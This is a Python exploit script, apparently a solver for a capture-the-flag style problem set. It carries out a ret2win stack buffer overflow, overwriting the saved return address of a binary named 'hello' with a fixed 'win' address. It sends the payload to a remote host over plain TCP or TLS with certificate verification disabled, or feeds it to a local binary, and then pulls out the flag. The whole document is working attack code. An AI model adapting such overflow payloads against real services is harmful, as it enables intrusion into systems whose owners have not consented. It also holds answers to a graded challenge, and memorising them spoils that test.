#!/usr/bin/env python3
import argparse
import re
import socket
import ssl
import struct
import subprocess
import sys

WIN = 0x401B00
OFFSET = 72


def p64(x: int) -> bytes:
    return struct.pack('<Q', x)


def build_payload() -> bytes:
    # main(): char name[64]; read(0, name, 0x100)
    # saved RIP is 64 bytes buffer + 8 bytes saved RBP = 72 bytes.
    return b'A' * OFFSET + p64(WIN)


def recv_some(sock, timeout=1.0) -> bytes:
    sock.settimeout(timeout)
    data = b''
    while True:
        try:
            chunk = sock.recv(4096)
        except socket.timeout:
            break
        if not chunk:
            break
        data += chunk
        if b'}' in data:
            break
    return data


def solve_remote(host: str, port: int, use_ssl: bool = False) -> None:
    raw = socket.create_connection((host, port), timeout=10)

    if use_ssl:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        s = ctx.wrap_socket(raw, server_hostname=host)
    else:
        s = raw

    with s:
        banner = recv_some(s, timeout=1.0)
        if banner:
            print(banner.decode(errors='replace'), end='')

        s.sendall(build_payload() + b'\n')

        out = recv_some(s, timeout=3.0)
        print(out.decode(errors='replace'), end='')

        m = re.search(rb'[A-Za-z0-9_]+\{[^}\n]+\}', out)
        if m:
            print(f"\n<FLAG>{m.group(0).decode(errors='replace')}</FLAG>")


def solve_local(binary: str) -> None:
    p = subprocess.run(
        [binary],
        input=build_payload() + b'\n',
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
    )
    out = p.stdout + p.stderr
    print(out.decode(errors='replace'), end='')

    m = re.search(rb'[A-Za-z0-9_]+\{[^}\n]+\}', out)
    if m:
        print(f"\n<FLAG>{m.group(0).decode(errors='replace')}</FLAG>")


def main() -> None:
    ap = argparse.ArgumentParser(description='ret2win solver for pset1')
    ap.add_argument('host', nargs='?', help='remote host')
    ap.add_argument('port', nargs='?', type=int, help='remote port')
    ap.add_argument('--ssl', action='store_true', help='use SSL/TLS socket')
    ap.add_argument('--local', action='store_true', help='run local ./hello')
    ap.add_argument('--binary', default='./hello', help='local binary path')
    args = ap.parse_args()

    print(f'[+] win   = {WIN:#x}')
    print(f'[+] offset= {OFFSET}')
    print(f'[+] payload length = {len(build_payload())}')

    if args.local:
        solve_local(args.binary)
        return

    if not args.host or args.port is None:
        print(f'usage remote: python3 {sys.argv[0]} HOST PORT [--ssl]')
        print(f'usage local : python3 {sys.argv[0]} --local')
        return

    solve_remote(args.host, args.port, args.ssl)


if __name__ == '__main__':
    main()
